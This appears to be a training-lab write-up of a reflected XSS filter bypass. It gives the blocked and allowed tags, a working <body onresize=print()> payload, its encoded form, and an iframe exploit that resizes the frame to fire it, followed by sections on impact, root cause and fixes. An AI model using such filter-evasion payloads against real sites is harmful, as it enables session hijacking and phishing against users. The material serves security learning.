# Reflected XSS with Filter Bypass (WAF Evasion)

## Description

The application attempts to prevent cross-site scripting (XSS) by filtering HTML tags and attributes. However, the filter is incomplete and allows certain tags and event handlers. By identifying allowed elements, it is possible to bypass the filter and execute JavaScript.

## Proof of Concept

Initial testing revealed:

* `<script>` tags were blocked
* `<img>` and `<iframe>` tags were blocked
* `<svg>` was partially allowed
* `<body>` tag was allowed
* `onload` was blocked, but `onresize` was allowed

Working payload:

```html id="z76m1b"
<body onresize=print()>
```

Encoded payload:

```text id="0xcnr0"
%3Cbody%20onresize%3Dprint()%3E
```

Exploit:

```html id="crjtqt"
<iframe src="https://0ab300e5033f9ca480f8031f001100da.web-security-academy.net/?search=%3Cbody%20onresize%3Dprint()%3E" onload="this.style.width='100px'; setTimeout(()=>this.style.width='200px',100);"></iframe>
```

## Impact

An attacker can bypass input filtering mechanisms and execute arbitrary JavaScript in a victim’s browser. This could lead to:

* Session hijacking
* Phishing attacks
* Unauthorized actions performed by the user

## Root Cause

The application relies on incomplete filtering (blocklists) rather than proper output encoding. This allows attackers to identify allowed tags and attributes and construct a working payload.

## Recommendation

* Use proper output encoding instead of filtering
* Avoid relying on blocklists for security
* Implement strict allowlists for HTML content
* Disable dangerous event handlers such as `on*` attributes
